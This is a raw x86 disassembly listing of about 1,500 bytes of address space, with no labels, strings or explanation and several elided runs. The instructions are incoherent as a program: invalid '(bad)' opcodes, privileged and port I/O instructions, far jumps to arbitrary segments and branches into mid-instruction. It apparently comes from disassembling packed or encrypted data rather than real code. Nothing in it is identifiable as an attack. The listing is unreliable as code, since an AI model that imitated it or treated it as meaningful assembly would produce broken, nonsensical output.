  419a8e:	pop    ds
  419a8f:	mov    eax,0x6bea4bd0
  419a94:	sub    DWORD PTR [edi+eax*4+0x7],esp
  419a98:	in     al,0xde
  419a9a:	inc    ecx
  419a9b:	xchg   BYTE PTR cs:[ecx-0x255baffa],cl
  419aa2:	sub    DWORD PTR ds:0xd1cf03ce,0xfa26015a
  419aac:	xor    BYTE PTR ds:0x14eb0401,bl
  419ab2:	dec    ebp
  419ab3:	aam    0xc9
  419ab5:	fsub   QWORD PTR ds:0xd7ccb8e3
  419abb:	pop    ecx
  419abc:	pop    ss
  419abd:	mov    ah,0xd9
  419abf:	out    dx,al
  419ac0:	inc    edx
  419ac1:	sub    BYTE PTR [ebp+0x73d6cf74],dl
  419ac7:	mov    al,0x8e
  419ac9:	test   al,0xd9
  419acb:	push   ds
  419acc:	pop    edi
  419acd:	out    dx,eax
  419ace:	mov    BYTE PTR [ebx-0x78a43b6d],cl
  419ad4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419ad5:	js     0x419a8b
  419ad7:	in     eax,dx
  419ad8:	adc    al,0xdc
  419ada:	retf   
  419adb:	add    BYTE PTR [edi-0x2b],dl
  419ade:	scas   al,BYTE PTR es:[edi]
  419adf:	in     al,dx
  419ae0:	and    al,0x8a
  419ae2:	pop    edx
  419ae3:	pushf  
  419ae4:	jmp    0xc294:0x1d5df704
  419aeb:	mov    esi,DWORD PTR [ebx+ebp*1+0x7f421dc3]
  419af2:	sbb    al,BYTE PTR [edi-0x551ae770]
  419af8:	(bad)  
  419af9:	sub    BYTE PTR [eax+ecx*8-0x50d16d35],ah
  419b00:	and    al,0x72
  419b02:	cmp    eax,0xf2024b83
  419b07:	xchg   DWORD PTR [esi],eax
  419b09:	xlat   BYTE PTR ss:[ebx]
  419b0b:	jb     0x419b8a
  419b0d:	dec    ebx
  419b0e:	and    BYTE PTR [eax],dh
  419b10:	sar    DWORD PTR [edx-0x2147611a],0xf5
  419b17:	cmp    al,0x39
  419b19:	add    dh,BYTE PTR [edx-0xbf25377]
  419b1f:	arpl   ax,dx
  419b21:	xor    ebp,DWORD PTR [eax-0x11]
  419b24:	std    
  419b25:	int3   
  419b26:	push   DWORD PTR [ebx+0x6cc249b5]
  419b2c:	jnp    0x419ada
  419b2e:	scas   eax,DWORD PTR es:[edi]
  419b2f:	add    BYTE PTR [edi],0x19
  419b32:	lahf   
  419b33:	(bad)  
  419b34:	stos   DWORD PTR es:[edi],eax
  419b35:	push   ebx
  419b36:	ret    0x7b08
  419b39:	xor    dh,BYTE PTR [esi+0x5d]
  419b3c:	pop    ds
  419b3d:	pusha  
  419b3e:	jmp    0x419b7e
  419b40:	xchg   DWORD PTR [esi-0x42adc220],esi
  419b46:	mov    dl,0xca
  419b48:	mov    gs,WORD PTR [ecx+0x7ad949d5]
  419b4e:	sub    DWORD PTR [eax-0xce43864],0xd3ef951c
  419b58:	dec    edx
  419b59:	mov    ch,0xd4
  419b5b:	stos   DWORD PTR es:[edi],eax
  419b5c:	jmp    0x529b7ffc
  419b61:	js     0x419bcb
  419b63:	bound  esp,QWORD PTR [ebp-0x836225e]
  419b69:	push   esi
  419b6a:	dec    edi
  419b6b:	div    ch
  419b6d:	jne    0x419af9
  419b6f:	push   ss
  419b70:	cld    
  419b71:	test   eax,esp
  419b73:	outs   dx,BYTE PTR ds:[esi]
  419b74:	ds out 0x62,eax
  419b77:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419b78:	xor    ah,BYTE PTR [edx+0x3b2fb815]
  419b7e:	xor    eax,0xbef82853
  419b83:	cmp    DWORD PTR [esi+0x2c],edi
  419b86:	sbb    DWORD PTR ds:0xdd759b99,0x68e1a0b2
	...
  419bf4:	dec    edx
  419bf5:	(bad)  
  419bf6:	cli    
  419bf7:	inc    edi
  419bf8:	(bad)  
  419bf9:	jg     0x419bfa
  419bfb:	int    0x88
  419bfd:	xchg   ecx,eax
  419bfe:	lods   al,BYTE PTR ds:[esi]
  419bff:	or     al,0x77
  419c01:	xchg   ebx,eax
  419c02:	dec    esp
  419c03:	adc    edx,esp
  419c05:	adc    BYTE PTR [ecx],al
  419c07:	add    BYTE PTR [ecx+eax*1],al
  419c0a:	add    BYTE PTR [eax],al
  419c0c:	push   ds
  419c0d:	arpl   WORD PTR [ebp-0x503a543e],bx
  419c13:	mov    ebx,0x81229058
  419c18:	ja     0x419c4e
  419c1a:	ret    0xb6f1
  419c1d:	(bad)  
  419c1e:	hlt    
  419c1f:	jnp    0x419c23
  419c21:	cld    
  419c22:	mov    ebp,0x9b09ac47
  419c27:	pop    es
  419c28:	push   cs
  419c29:	rcr    DWORD PTR [edx+0x23],cl
  419c2c:	mov    eax,0xfa9c3130
  419c31:	dec    ebx
  419c32:	js     0x419bf6
  419c34:	test   eax,0x4ad97aff
  419c39:	inc    ebp
  419c3a:	add    BYTE PTR [edx+ebx*4+0x1ab7a379],cl
  419c41:	rcr    DWORD PTR [eax+0x70],0xa8
  419c45:	mov    esi,0xe0e607dd
  419c4a:	add    eax,edx
  419c4c:	(bad)  [ebx+0x1]
  419c4f:	ret    0x6e50
  419c52:	sar    dl,1
  419c54:	mov    al,ds:0x21b9abfe
  419c59:	call   0x185f:0x6256fdd6
  419c60:	pop    edi
  419c61:	in     eax,dx
  419c62:	pop    ecx
  419c63:	xor    al,0xf
  419c65:	mov    eax,DWORD PTR [edx]
  419c67:	push   ds
  419c68:	inc    ebx
  419c69:	sub    eax,0xdff94b4c
  419c6e:	addr16 ds retf 0x52fb
  419c73:	rcr    BYTE PTR [ecx],0x7d
  419c76:	shl    BYTE PTR [ebx],1
  419c78:	lea    ebp,[ebx]
  419c7a:	xchg   BYTE PTR [esi],dh
  419c7c:	mov    edx,esi
  419c7e:	adc    BYTE PTR [ecx-0x5a1ed1c0],0x8c
  419c85:	xchg   edi,eax
  419c86:	dec    edi
  419c87:	iret   
  419c88:	and    DWORD PTR [esi+0xe05140c],0xffffff88
  419c8f:	ss scas al,BYTE PTR es:[edi]
  419c91:	dec    edx
  419c92:	jle    0x419cba
  419c94:	jno    0x419c28
  419c96:	repz aad 0x3
  419c99:	(bad)  
  419c9a:	imul   BYTE PTR [eax]
  419c9c:	scas   eax,DWORD PTR es:[edi]
  419c9d:	xchg   ebp,eax
  419c9e:	stc    
  419c9f:	std    
  419ca0:	inc    esi
  419ca1:	push   ss
  419ca2:	jo     0x419c32
  419ca4:	pop    ecx
  419ca5:	inc    ecx
  419ca6:	pusha  
  419ca7:	and    DWORD PTR [bx+di+0x596b],ecx
  419cac:	es jmp 0x9fbf:0x6f2ed06f
  419cb4:	cld    
  419cb5:	inc    esi
  419cb6:	xor    ebx,DWORD PTR [eax]
  419cb8:	jmp    0x419c8b
  419cba:	add    al,0xbb
  419cbc:	lea    ebx,[eax]
  419cbe:	push   edi
  419cbf:	int    0x58
  419cc1:	cmp    bl,dl
  419cc3:	imul   sp,WORD PTR [esi-0x3bdf5dfc],0x77
  419ccb:	xor    al,0x5d
  419ccd:	in     al,dx
  419cce:	xchg   esp,eax
  419ccf:	outs   dx,BYTE PTR ds:[esi]
  419cd0:	jae    0x419d16
  419cd2:	out    dx,eax
  419cd3:	stos   BYTE PTR es:[edi],al
  419cd4:	mov    al,ds:0xaea0000
  419cd9:	jno    0x419cbf
  419cdb:	push   ebx
  419cdc:	push   eax
  419cdd:	retf   
  419cde:	jnp    0x419d25
  419ce0:	cmp    BYTE PTR [ebx+0x7bb735f4],dl
  419ce6:	push   esi
  419ce7:	test   DWORD PTR [edx+0x6a141f81],0xde523dce
  419cf1:	pop    ebx
  419cf2:	je     0x419c91
  419cf4:	stos   BYTE PTR es:[edi],al
  419cf5:	mov    eax,0xfa762de1
  419cfa:	pop    ebp
  419cfb:	pop    edx
  419cfc:	(bad)  
  419cfd:	stc    
  419cfe:	mov    ds:0x3f8874c,al
  419d03:	lods   eax,DWORD PTR ds:[esi]
  419d04:	push   0x32585573
  419d09:	mov    ebx,0x99da8f00
  419d0e:	sbb    ebx,DWORD PTR [edx]
	...
  419d74:	lock xchg edi,eax
  419d76:	std    
  419d77:	cmp    al,0xff
  419d79:	jle    0x419d6c
  419d7b:	fistp  QWORD PTR [edi-0x16]
  419d7e:	ss (bad) 
  419d81:	imul   ebx,DWORD PTR [eax],0x111d8ca
  419d87:	add    BYTE PTR [ecx+eax*1],al
  419d8a:	add    BYTE PTR [eax],al
  419d8c:	lock mov al,ds:0xd945ca44
  419d92:	dec    ecx
  419d93:	stos   DWORD PTR es:[edi],eax
  419d94:	fwait
  419d95:	sub    eax,0xb1a26aad
  419d9a:	push   ds
  419d9b:	xchg   ebx,eax
  419d9c:	add    BYTE PTR [ebx],dh
  419d9e:	in     al,0x3b
  419da0:	sbb    dh,dh
  419da2:	xchg   DWORD PTR [esi-0x164137b],ebp
  419da8:	or     al,0x2d
  419daa:	int    0x32
  419dac:	or     al,BYTE PTR [edx+ecx*8-0xe800b98]
  419db3:	fsubr  QWORD PTR [edi]
  419db5:	fdiv   DWORD PTR [esi+0x25]
  419db8:	stos   BYTE PTR es:[edi],al
  419db9:	or     dh,dh
  419dbb:	sub    BYTE PTR [eax-0x85055bf],bh
  419dc1:	jae    0x419d64
  419dc3:	push   DWORD PTR [edx]
  419dc5:	xor    al,0xd5
  419dc7:	cmp    al,BYTE PTR [esi-0x6a]
  419dca:	repz inc ebp
  419dcc:	call   0x200df7d4
  419dd1:	adc    al,0xb0
  419dd3:	int    0x92
  419dd5:	sub    DWORD PTR [ecx+0x71],0x586c6479
  419ddc:	dec    eax
  419ddd:	push   es
  419dde:	jg     0x419e34
  419de0:	mov    ecx,0x195217
  419de5:	sbb    BYTE PTR [edx-0x4f],dh
  419de8:	xchg   edx,eax
  419de9:	mov    ebp,0xa9e68888
  419dee:	pop    esi
  419def:	jmp    0x31c2:0xb7b1b54
  419df6:	xchg   edi,eax
  419df7:	cmp    al,0xe3
  419df9:	shr    BYTE PTR [edi+0x64037907],cl
  419dff:	mov    eax,ds:0xd0644b1b
  419e04:	jg     0x419dc5
  419e06:	add    bh,BYTE PTR ds:0x68c1b62a
  419e0c:	ins    DWORD PTR es:[edi],dx
  419e0d:	aad    0x2
  419e0f:	pop    edi
  419e10:	xor    eax,0xfbc8a6fd
  419e15:	mov    BYTE PTR [edi+0xc],bh
  419e18:	in     eax,dx
  419e19:	push   esi
  419e1a:	inc    eax
  419e1b:	dec    esp
  419e1c:	jmp    0x2f13:0xcaa71447
  419e23:	sbb    DWORD PTR [edx+0x7d33118c],edx
  419e29:	dec    ebp
  419e2a:	xlat   BYTE PTR ds:[ebx]
  419e2b:	fisttp QWORD PTR [eax-0x65]
  419e2e:	retf   0x9ed1
  419e31:	mov    ds:0xe8228693,al
  419e36:	pop    ebx
  419e37:	test   DWORD PTR [edi+0x4f],0xd297f1d
  419e3e:	(bad)  
  419e3f:	pop    eax
  419e40:	lods   eax,DWORD PTR ds:[esi]
  419e41:	inc    esp
  419e42:	loopne 0x419e9d
  419e44:	adc    dh,ch
  419e46:	xchg   edi,eax
  419e47:	dec    edx
  419e48:	sub    eax,0x2a4c28db
  419e4d:	jns    0x419de9
  419e4f:	adc    DWORD PTR [ebp-0x2fddb1bc],ecx
  419e55:	and    ah,BYTE PTR [edx-0x210d7033]
  419e5b:	pop    ecx
  419e5c:	adc    DWORD PTR [edx-0x48],edi
  419e5f:	fdivr  DWORD PTR [ebx+0x7b9183ef]
  419e65:	retf   0xf27c
  419e68:	cmp    eax,0x5c219182
  419e6d:	or     DWORD PTR [esi-0x46],ecx
  419e70:	outs   dx,BYTE PTR ds:[esi]
  419e71:	sahf   
  419e72:	ret    
  419e73:	fadd   DWORD PTR [edx+0x43f92672]
  419e79:	test   DWORD PTR [edx+0x3304757b],ebx
  419e7f:	xor    ecx,0x8
  419e82:	dec    esi
  419e83:	leave  
  419e84:	jne    0x419e65
  419e86:	push   ebx
  419e87:	jmp    0x6c546f4d
  419e8c:	stc    
  419e8d:	mov    ss,WORD PTR [ebp+0x7a]
	...
  419ef4:	xchg   eax,ebx
  419ef6:	pop    ss
  419ef7:	lds    ebx,FWORD PTR [edi-0x31]
  419efa:	xlat   BYTE PTR ds:[ebx]
  419efb:	ficomp DWORD PTR [edi+ebp*4+0x55]
  419eff:	inc    esi
  419f00:	ins    BYTE PTR es:[edi],dx
  419f01:	sub    ebx,ebx
  419f03:	mov    ds:0x112dc,al
  419f08:	add    al,0x1
  419f0a:	add    BYTE PTR [eax],al
  419f0c:	shl    BYTE PTR [ebx+0x190a571f],1
  419f12:	xchg   BYTE PTR [ebx-0x2d],dh
  419f15:	pop    esp
  419f16:	imul   edx,DWORD PTR [edi-0x77f792bc],0x6c52a817
  419f20:	jo     0x419f43
  419f22:	ja     0x419f2c
  419f24:	in     al,0x36
  419f26:	in     eax,0xdd
  419f28:	mov    ecx,0x6a3115df
  419f2d:	pop    ebp
  419f2e:	dec    ebx
  419f2f:	mov    esi,0x8fb0b3b7
  419f34:	outs   dx,BYTE PTR gs:[esi]
  419f36:	pop    esp
  419f37:	loop   0x419f99
  419f39:	leave  
  419f3a:	push   esi
  419f3b:	in     al,dx
  419f3c:	or     DWORD PTR [edx+0x3b1f25a],0x3e
  419f43:	rcl    ebp,0x30
  419f46:	push   ecx
  419f47:	mov    al,cl
  419f49:	xchg   esi,eax
  419f4a:	jmp    0x74ebc116
  419f4f:	xchg   DWORD PTR [edi+eiz*8-0x7f],eax
  419f53:	cmp    bl,bl
  419f55:	add    ah,BYTE PTR fs:[ebx]
  419f58:	mov    cr3,ebp
  419f5b:	xchg   esi,eax
  419f5c:	sbb    eax,0xe6cd2a80
  419f61:	pop    eax
  419f62:	inc    ebx
  419f63:	or     BYTE PTR [esi+0x19],bl
  419f66:	sub    al,0xfa
  419f68:	mov    ebx,0x5c480ec7
  419f6d:	or     BYTE PTR [esi-0x14aceff],bl
  419f73:	and    BYTE PTR [ecx-0x3d587c39],dh
  419f79:	fbstp  TBYTE PTR ds:0xe6bbdecd
  419f7f:	rcl    dl,1
  419f81:	pusha  
  419f82:	sbb    BYTE PTR [eax],ch
  419f84:	jns    0x419f54
  419f86:	repz or edx,esi
  419f89:	xchg   BYTE PTR [esi-0x3c202233],ah
  419f8f:	xor    eax,0x927a0dfa
  419f94:	pop    ebp
  419f95:	ins    BYTE PTR es:[edi],dx
  419f96:	pop    ebp
  419f97:	adc    dh,BYTE PTR [ebx+esi*1-0x71b6ab5f]
  419f9e:	xor    cl,cl
  419fa0:	mov    edi,0x52492c8a
  419fa5:	out    0xd4,eax
  419fa7:	test   DWORD PTR [edx+0x1d9a154],esp
  419fad:	xchg   edi,eax
  419fae:	push   ebx
  419faf:	lds    ecx,FWORD PTR [ebp+0x1a]
  419fb2:	jl     0x419f8f
  419fb4:	cmp    al,0x2d
  419fb6:	mov    al,0x7d
  419fb8:	popa   
  419fb9:	in     eax,0xc
  419fbb:	in     eax,0x3
  419fbd:	mov    ebp,0xb43e4210
  419fc2:	dec    esp
  419fc3:	sub    esi,DWORD PTR [esi-0x415b890e]
  419fc9:	sub    BYTE PTR [ebx+0x1f90bec],0xde
  419fd0:	adc    edx,DWORD PTR [edi+0x4d]
  419fd3:	pusha  
  419fd4:	cmp    DWORD PTR [ebp+edx*8+0x76803abf],esi
  419fdb:	test   BYTE PTR [esi],0x36
  419fde:	ja     0x419fe8
  419fe0:	jmp    0xe1e331bb
  419fe5:	int    0x53
  419fe7:	lock clc 
  419fe9:	inc    ecx
  419fea:	dec    edi
  419feb:	jmp    0x419fa3
  419fed:	mov    bl,0x47
  419fef:	push   ebp
  419ff0:	sub    DWORD PTR [esp+ebx*1+0x1f],ebx
  419ff4:	inc    eax
  419ff5:	lods   eax,DWORD PTR ds:[esi]
  419ff6:	mov    edi,DWORD PTR [edi+edi*1+0x553881eb]
  419ffd:	mov    bh,0xe0
  419fff:	cwde   
  41a000:	(bad)  
  41a002:	and    al,0x74
  41a004:	sbb    DWORD PTR [ebx+0x22ce06a9],edx
  41a00a:	mov    cl,0x2e
  41a00c:	cwde   
  41a00d:	je     0x419fe2
  41a00f:	mov    cl,0x0
	...
  41a071:	add    BYTE PTR [eax],al
  41a073:	add    BYTE PTR [esi-0x15],cl
  41a076:	sub    cl,BYTE PTR [esi-0x51]
  41a079:	iret   
  41a07a:	outs   dx,BYTE PTR ds:[esi]
  41a07b:	jmp    0x41a000
  41a07d:	push   edx
  41a07e:	test   BYTE PTR [eax-0x3f],bh
  41a081:	mov    ebx,ecx
  41a083:	shl    al,cl
  41a085:	adc    eax,DWORD PTR [ecx]
  41a087:	add    BYTE PTR [ecx+eax*1],al
  41a08a:	add    BYTE PTR [eax],al
  41a08c:	mov    bl,0x32
  41a08e:	mov    es,esp
  41a090:	and    dl,BYTE PTR [eax]
  41a092:	pop    esp
  41a093:	inc    ebx
  41a094:	test   BYTE PTR [eax-0x7e4f4279],ah
  41a09a:	cmp    al,0xa0
  41a09c:	lods   eax,DWORD PTR ds:[esi]
  41a09d:	inc    ebx
  41a09e:	inc    ebp
  41a09f:	or     al,0x27
  41a0a1:	int    0xc1
  41a0a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a0a4:	aas    
  41a0a5:	test   BYTE PTR [edx],0xd7
  41a0a8:	mov    edi,0x2e2bbcbd
  41a0ad:	fisub  DWORD PTR [edx+0x45bb6448]
  41a0b3:	mov    DWORD PTR [esi-0x4aa3b369],esi
  41a0b9:	lds    esp,FWORD PTR [eax]
  41a0bb:	sub    al,0xc5
  41a0bd:	mov    dh,0x72
  41a0bf:	sysret 
  41a0c1:	inc    edi
  41a0c2:	dec    edx
  41a0c3:	adc    eax,0x3f1de9b2
  41a0c8:	fistp  QWORD PTR [edx]
  41a0ca:	inc    edx
  41a0cb:	sub    eax,DWORD PTR ds:0xe529b12b
  41a0d1:	adc    DWORD PTR [ebx],eax
  41a0d3:	(bad)  
  41a0d5:	jge    0x41a0e3
  41a0d7:	mov    WORD PTR [ecx-0x21947eab],es
  41a0dd:	popa   
  41a0de:	pusha  
  41a0df:	jnp    0x41a0a4
  41a0e1:	push   esp
  41a0e2:	or     eax,0x70ebded0
  41a0e7:	xlat   BYTE PTR ds:[ebx]
  41a0e8:	ror    BYTE PTR [ebx+ebx*1+0x6c],0x92
  41a0ed:	dec    ecx
  41a0ee:	dec    esp
  41a0ef:	dec    edx
  41a0f0:	sub    BYTE PTR [ebx+0x782cfc36],al
  41a0f6:	stc    
  41a0f7:	pop    ss
  41a0f8:	loopne 0x41a07b
  41a0fa:	or     al,0xd
  41a0fc:	jbe    0x41a0b6
  41a0fe:	or     edi,DWORD PTR [esi-0x67a1d9d5]
  41a104:	xor    ah,al
  41a106:	loopne 0x41a0ef
  41a108:	adc    dh,dl
  41a10a:	imul   ebx,DWORD PTR [ecx+0x5c1f89b8],0x245f4f5
  41a114:	sub    al,0x98
  41a116:	inc    ebx
  41a117:	stc    
  41a118:	clc    
  41a119:	out    0x50,al
  41a11b:	mov    al,0x3d
  41a11d:	mov    dl,0x41
  41a11f:	cmp    eax,0x6e5573c9
  41a124:	pushf  
  41a125:	mov    ah,0x1e
  41a127:	xchg   BYTE PTR [edi-0x7bc17067],bh
  41a12d:	push   ebx
  41a12e:	dec    eax
  41a12f:	in     eax,dx
  41a130:	out    dx,al
  41a131:	imul   edi,DWORD PTR [edi],0xffffff98
  41a134:	dec    edi
  41a135:	or     ecx,DWORD PTR [esi-0x2a7e3bdc]
  41a13b:	add    eax,0x48e140a2
  41a140:	adc    esi,esp
  41a142:	mov    ecx,0x1e977e89
  41a147:	jecxz  0x41a120
  41a149:	jmp    0xe38889f0
  41a14e:	std    
  41a14f:	sar    cl,1
  41a151:	leave  
  41a152:	shl    esi,1
  41a154:	cmp    al,0x5
  41a156:	pop    esp
  41a157:	dec    ebp
  41a158:	push   eax
  41a159:	lock in eax,dx
  41a15b:	xchg   esi,eax
  41a15c:	pop    edx
  41a15d:	xchg   esi,eax
  41a15e:	fsubr  st,st(3)
  41a160:	mov    ebp,0xbbfd384f
  41a165:	pop    ss
  41a166:	or     al,0xd4
  41a168:	jecxz  0x41a0fa
  41a16a:	ja     0x41a19f
  41a16c:	out    0x8c,eax
  41a16e:	stos   BYTE PTR es:[edi],al
  41a16f:	out    0xae,eax
  41a171:	je     0x41a1b8
  41a173:	pop    ds
  41a174:	push   edx
  41a175:	xchg   ebx,eax
  41a176:	add    dh,BYTE PTR [edx-0x6e]
  41a179:	push   esp
  41a17a:	pop    esi
  41a17b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a17c:	xor    BYTE PTR [eax],cl
  41a17e:	repnz pop es
  41a180:	call   0x96d8f11a
  41a185:	add    edx,ebx
  41a187:	imul   edi,DWORD PTR [ebx-0x1ee53734],0xffffffba
  41a18e:	retf   
  41a18f:	inc    edi
	...
  41a1f4:	sbb    al,0xc
  41a1f6:	std    
  41a1f7:	sbb    ebp,edi
  41a1f9:	stc    
  41a1fa:	cld    
  41a1fb:	or     eax,0x398d6850
  41a200:	fmul   QWORD PTR [ebx]
  41a202:	shr    BYTE PTR [ebx-0x1c],cl
  41a205:	adc    al,0x1
  41a207:	add    BYTE PTR [ecx+eax*1],al
  41a20a:	add    BYTE PTR [eax],al
  41a20c:	push   edx
  41a20d:	mov    esi,0x646ec8d2
  41a212:	into   
  41a213:	pusha  
  41a214:	cdq    
  41a215:	in     eax,0xc5
  41a217:	mov    es,edi
  41a219:	mov    DWORD PTR [ebp-0x67],0x50bf92e7
  41a220:	or     al,0xed
  41a222:	jge    0x41a23a
  41a224:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a225:	lods   eax,DWORD PTR ds:[esi]
  41a226:	aad    0xa8
  41a228:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a229:	xor    edx,esp
  41a22b:	mov    ebx,0x7df5394a
  41a230:	jae    0x41a20c
  41a232:	jecxz  0x41a287
  41a234:	fs push 0x11d86765
  41a23a:	scas   al,BYTE PTR es:[edi]
  41a23b:	xchg   edi,eax
  41a23c:	jns    0x41a1dd
  41a23e:	pushf  
  41a23f:	push   ebx
  41a240:	(bad)  
  41a241:	sbb    esi,ebx
  41a243:	mov    bl,0x76
  41a245:	add    al,0x3f
  41a247:	sbb    eax,0x7c14af09
  41a24c:	icebp  
  41a24d:	(bad)
  41a250:	ret    
  41a251:	mov    dh,0x8b
  41a253:	cs push esp
  41a255:	sub    eax,0x31277f29
  41a25a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a25b:	xor    al,0xd0
  41a25d:	cmp    eax,0xe0827015
  41a262:	inc    ebx
  41a263:	jle    0x41a1f9
  41a265:	mov    esp,0x7dcdc76d
  41a26a:	test   BYTE PTR [ecx-0x8],ch
  41a26d:	mov    ds:0xa71d569f,al
  41a272:	add    bh,BYTE PTR [ebx+0x11]
  41a275:	cmp    DWORD PTR [edi+ebx*1],edi
  41a278:	xchg   DWORD PTR [esi+ebx*2-0x33e2868b],esi
  41a27f:	stc    
  41a280:	(bad)  
  41a281:	jmp    0xdab9:0x30e9136a
  41a288:	sbb    esp,ebx
  41a28a:	into   
  41a28b:	jmp    0xf290aaf0
  41a290:	pop    esi
  41a291:	call   0x8768:0x3cdd7360
  41a298:	fisub  DWORD PTR [eax-0x2c]
  41a29b:	addr16 hlt 
  41a29d:	jp     0x41a22f
  41a29f:	(bad)  
  41a2a0:	cld    
  41a2a1:	daa    
  41a2a2:	or     al,0x86
  41a2a4:	add    esp,DWORD PTR [eax+edi*4-0x5d]
  41a2a8:	shl    BYTE PTR [ecx],1
  41a2aa:	pusha  
  41a2ab:	xor    edi,edx
  41a2ad:	sbb    DWORD PTR [eax+0x2a],esp
  41a2b0:	es sub eax,0xe74d2dd2
  41a2b6:	xor    eax,0xd5ccafdd
  41a2bb:	sbb    dl,BYTE PTR [edi]
  41a2bd:	push   0xffffffa8
  41a2bf:	dec    ebx
  41a2c0:	outs   dx,DWORD PTR ds:[esi]
  41a2c1:	div    DWORD PTR [eax+0x5a]
  41a2c4:	ret    0x8524
  41a2c7:	sbb    DWORD PTR [ebx+0x3a32674c],edi
  41a2cd:	inc    edi
  41a2ce:	mov    al,ds:0xe440ef99
  41a2d3:	lea    esi,[ebx-0x167ec434]
  41a2d9:	cli    
  41a2da:	in     al,dx
  41a2db:	xchg   edi,eax
  41a2dc:	xchg   ebx,eax
  41a2dd:	xchg   edi,eax
  41a2de:	loopne 0x41a35b
  41a2e0:	imul   edx,DWORD PTR [esi-0x1bad03d],0xc0d7e461
  41a2ea:	lea    eax,[ebp+0x38]
  41a2ed:	jno    0x41a325
  41a2ef:	iret   
  41a2f0:	out    dx,al
  41a2f1:	mov    DWORD PTR [edi+ebx*8],edi
  41a2f4:	pop    es
  41a2f5:	mov    BYTE PTR [edi-0x15],dl
  41a2f8:	push   0xffffffd2
  41a2fa:	push   ss
  41a2fb:	lea    ebx,[ecx+ebp*4+0x66]
  41a2ff:	adc    al,0xbc
  41a301:	test   esp,esi
  41a303:	pop    ds
  41a304:	or     eax,0x3962bf3b
  41a309:	xor    DWORD PTR [edx],ecx
  41a30b:	xchg   ebp,eax
  41a30c:	push   edi
  41a30d:	xor    bl,BYTE PTR [ebp-0x69]
	...
  41a374:	neg    DWORD PTR [eax-0x58]
  41a377:	adc    ebp,DWORD PTR [edi+0x15fcfff3]
  41a37d:	pop    esp
  41a37e:	xchg   ebp,eax
  41a37f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a380:	addr16 inc edi
  41a382:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a383:	dec    ecx
  41a384:	call   0x441a49e
  41a389:	add    DWORD PTR [eax],eax
  41a38b:	add    BYTE PTR [edx],ch
  41a38d:	retf   0xfabb
  41a390:	sub    BYTE PTR [ebx],ch
  41a392:	lds    esp,FWORD PTR [edi]
  41a394:	rcr    DWORD PTR [eax],0x71
  41a397:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a398:	pop    ss
  41a399:	cmp    BYTE PTR [esi+eax*4-0xc],dl
  41a39d:	test   eax,0x6d1b92ff
  41a3a2:	mov    cs,edx
  41a3a4:	mov    ?,WORD PTR [edx+0x33]
  41a3a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a3a8:	shl    DWORD PTR [ebp+0x1a59be8d],0x3a
  41a3af:	jns    0x41a3aa
  41a3b1:	call   0x38db2c2c
  41a3b6:	not    DWORD PTR [ecx]
  41a3b8:	xchg   edi,eax
  41a3b9:	add    DWORD PTR [ebx-0x47406134],ebp
  41a3bf:	sar    DWORD PTR [ecx+0x3ccb8794],0xfb
  41a3c6:	fmul   st(0),st
  41a3c8:	shr    DWORD PTR [edi+eax*8],cl
  41a3cb:	dec    edx
  41a3cc:	test   DWORD PTR [edi-0x570da5cd],ebx
  41a3d2:	mov    cl,BYTE PTR [edx]
  41a3d4:	jecxz  0x41a3b2
  41a3d6:	aad    0x3b
  41a3d8:	adc    ecx,DWORD PTR [ebx-0x30]
  41a3db:	test   al,0xbd
  41a3dd:	lods   al,BYTE PTR ds:[esi]
  41a3de:	in     al,0x24
  41a3e0:	fisub  WORD PTR [ebx+0x28]
  41a3e3:	mov    bl,0x90
  41a3e5:	rol    BYTE PTR [esi],1
  41a3e7:	inc    eax
  41a3e8:	jns    0x41a446
  41a3ea:	fidivr DWORD PTR [eax]
  41a3ec:	gs rol al,0x73
  41a3f0:	hlt    
  41a3f1:	ror    esi,cl
  41a3f3:	retf   0xe4e0
  41a3f6:	mov    bh,0x61
  41a3f8:	gs mov cs:0x7fbaaa45,al
  41a3ff:	xchg   BYTE PTR [edi+0x3dc6d4bd],dh
  41a405:	sub    DWORD PTR [edx+0x60],ecx
  41a408:	shl    DWORD PTR [edi],0x99
  41a40b:	nop
  41a40c:	(bad)  
  41a40d:	call   DWORD PTR [edx+eax*8-0x2f]
  41a411:	ret    
  41a412:	xchg   esp,eax
  41a413:	inc    edx
  41a414:	je     0x41a48f
  41a416:	jmp    0x2acc019a
  41a41b:	jns    0x41a429
  41a41d:	fimul  WORD PTR [eax-0x7f71e0d0]
  41a423:	push   ds
  41a424:	cld    
  41a425:	mov    ds:0x74474f70,eax
  41a42a:	mov    esi,0xb276b2b3
  41a42f:	inc    esp
  41a430:	xchg   edx,eax
  41a431:	cmp    eax,0xdc6d5718
  41a436:	call   FWORD PTR [ecx+0x4fb2d08f]
  41a43c:	dec    ebp
  41a43d:	mov    dl,0x17
  41a43f:	outs   dx,BYTE PTR ds:[esi]
  41a440:	rcl    BYTE PTR [ebx+0x6c],cl
  41a443:	push   cs
  41a444:	lgs    ebx,FWORD PTR [esi-0x2e]
  41a448:	es inc ebp
  41a44a:	push   ss
  41a44b:	(bad)  
  41a44c:	popf   
  41a44d:	pushf  
  41a44e:	push   es
  41a44f:	push   edi
  41a450:	(bad)  
  41a451:	jmp    0x6b426b51
  41a456:	popf   
  41a457:	js     0x41a471
  41a459:	xchg   BYTE PTR fs:[ecx+0x691bc733],dl
  41a460:	pop    ebp
  41a461:	sti    
  41a462:	sbb    eax,0xb7300a59
  41a467:	ficomp DWORD PTR [ebx+0x6d]
  41a46a:	adc    al,0x6d
  41a46c:	add    bh,BYTE PTR [ebp-0x3e]
  41a46f:	sub    BYTE PTR [edi+edi*1],cl
  41a472:	or     BYTE PTR [edi+0x58],al
  41a475:	pop    ds
  41a476:	dec    edx
  41a477:	mov    WORD PTR [ebx+edi*8+0x5b0ce9d7],fs
  41a47e:	or     al,0xaf
  41a480:	outs   dx,DWORD PTR ds:[esi]
  41a481:	ins    BYTE PTR es:[edi],dx
  41a482:	in     eax,0xad
  41a484:	add    dl,bh
